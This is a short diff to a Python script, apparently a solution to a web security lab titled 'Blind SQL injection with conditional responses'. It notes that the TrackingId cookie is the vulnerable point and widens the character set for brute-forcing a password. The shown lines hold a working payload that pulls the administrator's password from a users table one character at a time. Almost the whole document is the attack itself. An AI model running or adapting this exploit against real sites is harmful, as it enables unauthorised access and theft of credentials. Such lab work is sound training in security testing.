@@ -1,5 +1,6 @@
 
 # Blind SQL injection with conditional responses
+# Vulnerability in TrackingId cookie
 
 import requests
 import urllib3
@@ -44,7 +45,7 @@ for i in range(1,100):
 # Finding Password
 print('\n[+] Finding Password For Administrator User...')
 password = ''
-chars = string.ascii_lowercase + string.digits
+chars = string.digits + string.ascii_letters
 for i in range(1, pass_len + 1):
     for c in chars:
         payload = f"' AND (SELECT SUBSTRING(password,{i},1) FROM users WHERE username='administrator')='{c}'--"
